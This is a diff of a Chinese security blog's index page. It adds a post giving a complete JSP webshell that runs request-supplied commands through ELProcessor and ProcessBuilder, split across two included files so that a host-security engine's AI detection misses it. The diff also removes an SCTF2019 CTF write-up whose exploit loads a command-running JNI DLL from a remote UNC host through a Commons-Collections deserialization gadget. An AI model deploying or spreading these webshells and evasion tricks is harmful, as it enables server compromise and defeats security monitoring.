@@ -207,7 +207,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/红蓝对抗/">红蓝对抗</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/红蓝对抗/">红蓝对抗</a></li></ul>
                     </div>
                 </section>
                 
@@ -291,6 +291,90 @@
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-antiav-jsp-webshell" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="2021/02/06/antiav-jsp-webshell/" class="article-date">
+      <time datetime="2021-02-06T14:25:31.000Z" itemprop="datePublished">2021-02-06</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2021/02/06/antiav-jsp-webshell/">JSP免杀 —— 绕过智能AI？</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>玩某云的“卷完计划”想到的姿势，分享一下。</p>
+<p>某云的骑士号称是采用先进的动态监测技术，结合主机智能内核AI检测技术等多种引擎零规则查杀，做到低误报，高查杀率。</p>
+<p>测下来查杀率确实高，只要出现 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 等命令执行直接相关的方法调用就杀，不过一个样本测下来要一分钟，速度相当慢，实际落地还要很长的路要走。/狗头</p>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>开始讲绕过。</p>
+<p>首先是命令执行的sink，直接写 <code>Runtime.getRuntime().exec()</code> 即使jsp编译不通过也是会被check到的，说明引擎有一些强检测逻辑，类似正则，匹配即杀。而如果迂回一下，我们找一个跳板，比如 <code>new ProcessBuilder()</code> ，或者反射构造 <code>ProcessImpl</code> 实例，还不会被杀，(用法参考<a href="https://xz.aliyun.com/t/7798" target="_blank" rel="noopener">三梦的文章</a>)。</p>
+<p>构造好跳板，当调用 <code>start()</code> 实际执行的时候，如果命令是硬编码的没有杀，如果是从 request.getParameter(“xxx”) 取的还是会杀的。</p>
+<p>说明引擎应该用到了类似污点分析的原理，更换命令执行的 sink 是可以绕过的，但要完全绕过还要找别的 source，试了一圈 request 对象的方法，只有 request.getSchema() 等内容不可控方法的时候不会杀，内容不可控有啥用:(</p>
+<p>研究了下，我想到了这个引擎的问题（应该也通杀别的），就是在检测时，无法构造出完整的上下文环境。它是单文件一个个扫过去的，如果我们拆分 soure-sink 到多个文件呢，扫任意一个jsp都没问题。甚至很可能因为通不过编译，压根儿动态监测不起来。</p>
+<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>下面用到 jsp 的一个特性 include 指令。</p>
+<blockquote>
+<p>include 指令用于通知 JSP 引擎在翻译当前 JSP 页面时，将其他文件中的内容合并进当前 JSP 页面转换成的 Servlet 源文件中，这种在源文件级别进行引入的方式，称为静态引入，当前 JSP 页面与静态引入的文件紧密结合为一个 Servlet。这些文件可以是 JSP 页面、HTML 页面、文本文件或是一段 Java 代码。</p>
+</blockquote>
+<p>我们完全可以把完整的逻辑拆分，即把参数获取和命令执行的分开。</p>
+<p>举个例子</p>
+<p>AB.jsp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;javax.el.ELProcessor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    ELProcessor processor = new ELProcessor();</span><br><span class="line">    Process process = (Process) processor.eval(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass()&quot; +</span><br><span class="line">                    &quot;.forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +</span><br><span class="line">                    &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;&quot; +</span><br><span class="line">                    cmd + &quot;&apos;]).start()\&quot;)&quot;);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getOutputStream().write(sb.toString().getBytes());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>source request.getParameter，通过 sink ELProcessor.eval 执行命令，会被杀。</p>
+<p>拆分逻辑到 A.jsp B.jsp</p>
+<p>A.jsp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>B.jsp ELProcessor.eval 执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.el.ELProcessor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@include file=&quot;A.jsp&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    ELProcessor processor = new ELProcessor();</span><br><span class="line">    Process process = (Process) processor.eval(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass()&quot; +</span><br><span class="line">                    &quot;.forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +</span><br><span class="line">                    &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;&quot; +</span><br><span class="line">                    cmd + &quot;&apos;]).start()\&quot;)&quot;);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getOutputStream().write(sb.toString().getBytes());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>A.jsp 只负责取参，看起来没有问题。</p>
+<p>B.jsp sink没有被硬杀，而且缺少 A.jsp 的情况编译不过，跑不起来动态监测不了。</p>
+<p>完全绕过。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/JSP/">JSP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/RedTeam/">RedTeam</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/红蓝对抗/">红蓝对抗</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-compile-virtualbox-on-macos10-15" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -638,125 +722,6 @@
       
 
       
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-sctf-2019-babyEoP-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="2019/06/26/sctf-2019-babyEoP-Writeup/" class="article-date">
-      <time datetime="2019-06-26T06:37:52.000Z" itemprop="datePublished">2019-06-26</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2019/06/26/sctf-2019-babyEoP-Writeup/">SCTF2019 babyEoP Writeup</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 第一次给比较正式的比赛出题 :) ，花了挺长时间准备的。之前还一直担心题目太简单被神仙们秒了，看结果还是阔以的——0解，也有些遗憾，没能让 Part 2 出来。</p>
-<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><p>题目给了一个webshell，弱口令 123456 直接进去。</p>
-<p>Tomcat启用了<em>Java Security Manager</em>，webshell基本所有功能无法正常使用，但是可以查看有限的几个目录文件，无写权限。</p>
-<p>如果顺利，应该可以收集到以下信息：</p>
-<ol>
-<li><p>cookie处存在反序列化的点，有反序列化漏洞。</p>
-</li>
-<li><p>查看lib目录，存在 commons-collections 3.1 gadget。</p>
-</li>
-<li><p>找到 <code>catalina.policy</code> 文件，是Tomcat默认的安全策略配置文件，这应该是本题可能有点脑洞的地方，因为没有给 <code>C:/babyEoP/apache-tomcat-8.5.42</code> 的读权限，所以无法列目录，但是 <code>conf</code> 目录是可读的。（有将近10位选手读到了这个文件hhhh。）</p>
-<p>我在官方提供的 <code>catalina.policy</code> 的基础上，做了一些修改。给了 <em>LoadLibrary</em> 、 <em>createClassLoader</em>、 <em>accessDeclaredMembers</em> 几个重要权限。</p>
-</li>
-</ol>
-<p>分析 policy ，应该很容易可以想到，要通过 JNI 绕过 <em>Java Security Manager</em>。但是 JNI 需要加载一个 dll 动态链接库，由于并没有给任何写权限，所以是不可能上传 dll 的。</p>
-<p>并且，webshell 的 <code>Eval Java Code</code> 使用时，需要向当前目录写一个 <code>tmp.jsp</code> 文件，所以也是不能用的（不要想着用这个执行代码）。</p>
-<p>那么该如何才能执行代码来加载一个不在本地的dll呢？</p>
-<p>下面是具体的解题思路：</p>
-<p>题目已经给了反序列化的点以及gadget，可以通过这个来执行代码。</p>
-<blockquote>
-<p>ysoserial 的 commons-collections 利用链提供了几个直接执行命令的 gadget，但是都是基于 Runtime.exec 的，并没有给这个权限。So 想要直接利用是不行的。</p>
-</blockquote>
-<p>但是直接用 gadget 构造出加载dll可能比较困难，所以这里可以利用稍微高级一点的方法——加载外部的jar来执行代码。</p>
-<p>构造见 <a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a> (基于 CommonsCollections6)</p>
-<blockquote>
-<p>有些师傅用的 CommonsCollections5 gadget 改的，但是 BadAttributeValueExpException 在反序列化时，会检查是否启用 JSM，如果启用了，则不会触发 gadget 需要的 toString 方法，导致利用失败。</p>
-</blockquote>
-<p>下面要加载 dll，用 JNI 绕 JSM。</p>
-<p>同样因为没有写权限，且 dll 无法一起打包到 jar 里，所以要从网络上加载 dll。</p>
-<p>这里利用 <code>System.load</code> 的一个特性——可以使用 UNC 路径，加载远程的 dll。</p>
-<p>为什么可以使用 UNC 呢？来看下 System.load 的调用过程。</p>
-<ol>
-<li>System.load</li>
-</ol>
-<p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561382235958.png" alt="1561382235958"></p>
-<p>​  调用了 Runtime.getRuntime().load0</p>
-<ol start="2">
-<li><p>Runtime.getRuntime().load0</p>
-<p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561383875593.png" alt="1561383875593"></p>
-</li>
-</ol>
-<p>​  在这里会判断 filename 是否是一个绝对路径，如果不是就直接抛出异常，是就进一步加载。</p>
-<ol start="3">
-<li><p>File.isAbsolute</p>
-<p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561382827270.png" alt="1561382827270"></p>
-<p>再看看 File 是如何判断是否是绝对路径的。</p>
-<p>根据描述，linux下要求以 <code>/</code> 开头。windows下，要求以盘符或者 <code>\\\\</code> 开头。</p>
-</li>
-</ol>
-<p>emm 综上，所以这里可以使用 UNC 路径。</p>
-<p>下面是另一个坑，UNC 默认是走 445 端口的，如果没有特殊情况，公网上都是屏蔽了这个端口的。</p>
-<p>这里利用 windows 一个特性，在开启了 webclient 服务的情况下，UNC 访问 445 失败时，会尝试访问目标服务器80端口的 webdav 去加载资源 (‾◡◝)， 这一点 hint 已经提示过了。</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>R.java</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">R</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">	    System.load(<span class="string">"\\\\xxx.xxx.xxx.xxx\\JNI.dll"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">R</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac R.java</span><br><span class="line">jar cvf R.jar R.class</span><br></pre></td></tr></table></figure>
-<p>将打包的 R.jar 放到服务器上的 web 服务下。</p>
-<h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><h4 id="R-h"><a href="#R-h" class="headerlink" title="R.h"></a>R.h</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line">	JNIEXPORT void JNICALL Java_R_exec</span><br><span class="line">	(JNIEnv *, jclass, jstring);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
-<h4 id="R-cpp"><a href="#R-cpp" class="headerlink" title="R.cpp"></a>R.cpp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;R.h&quot;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_R_exec</span><br><span class="line">(JNIEnv *env, jclass clazz, jstring str) &#123;</span><br><span class="line">	char* cmd= (char*)env-&gt;GetStringUTFChars(str,JNI_FALSE);</span><br><span class="line">	system(cmd);</span><br><span class="line">	env-&gt;ReleaseStringUTFChars(str,cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译成 dll，放到服务器的 webdav 服务下。</p>
-<p>用 <a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a> 构造序列化 payload，贴到 cookie 里打一发，完事儿~</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/CTF/">CTF</a></li></ul>
-    </div>
-
       
       <div class="clearfix"></div>
     </div>
